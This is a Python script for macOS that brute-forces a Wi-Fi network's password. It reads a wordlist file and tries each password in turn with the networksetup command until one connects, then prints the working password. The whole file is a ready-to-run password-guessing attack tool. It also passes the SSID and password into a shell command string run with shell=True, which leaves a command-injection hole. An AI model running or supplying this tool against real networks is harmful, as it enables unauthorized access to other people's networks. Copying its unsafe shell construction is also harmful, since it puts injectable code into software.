import subprocess

def connect_to_wifi(ssid, password):
    try:
        # Command to connect to Wi-Fi
        command = f'networksetup -setairportnetwork en0 "{ssid}" "{password}"'
        result = subprocess.run(command, shell=True, capture_output=True, text=True)

        if result.returncode != 0:
            return False, password

        # Check the current connection
        check_command = 'networksetup -getairportnetwork en0'
        check_result = subprocess.run(check_command, shell=True, capture_output=True, text=True)
        
        if ssid in check_result.stdout:
            return True, password
        else:
            return False, password

    except Exception as e:
        return False, str(e)

def read_passwords(file_path):
    try:
        with open(file_path, 'r') as file:
            passwords = file.readlines()
        return [p.strip() for p in passwords]
    except Exception as e:
        print(f"Error reading file: {e}")
        return []

def main():
    ssid = "example ssid"  # Replace with your SSID
    password_file_path = "./pass.txt"  # Replace with the path to your password file

    passwords = read_passwords(password_file_path)
    if not passwords:
        print("Password list is empty or failed to read the file.")
        return

    for password in passwords:
        success, info = connect_to_wifi(ssid, password)
        if success:
            print(f"Successfully connected to Wi-Fi with password: {info}")
            return
        else:
            print(f"Failed to connect with password: {info}")

    print("Failed to connect with any of the passwords.")

if __name__ == "__main__":
    main()
